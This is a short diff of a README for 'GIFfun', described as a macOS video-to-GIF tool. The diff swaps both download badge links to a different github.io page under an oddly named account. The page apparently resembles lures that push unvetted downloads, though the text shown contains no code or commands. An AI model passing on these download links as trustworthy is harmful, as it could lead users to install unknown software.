@@ -7,7 +7,7 @@ With fast processing and customizable settings, GIFfun is the perfect tool for a
 ---
 
 ## ✅ Download GIFfun for macOS  
-[![Download GIFfun](https://img.shields.io/badge/Download-GIFfun-blueviolet)](https://giffun-download-mac.github.io/.github)
+[![Download GIFfun](https://img.shields.io/badge/Download-GIFfun-blueviolet)](https://shuziktobehuman.github.io/huja/GIFfun)
 
 ---
 
@@ -58,7 +58,7 @@ GIFfun is a dedicated macOS application designed to convert videos and photo seq
 
 ---
 
-[![Download GIFfun](https://img.shields.io/badge/Download-GIFfun-blueviolet)](https://giffun-download-mac.github.io/.github)
+[![Download GIFfun](https://img.shields.io/badge/Download-GIFfun-blueviolet)](https://shuziktobehuman.github.io/huja/GIFfun)
 
 ---
 
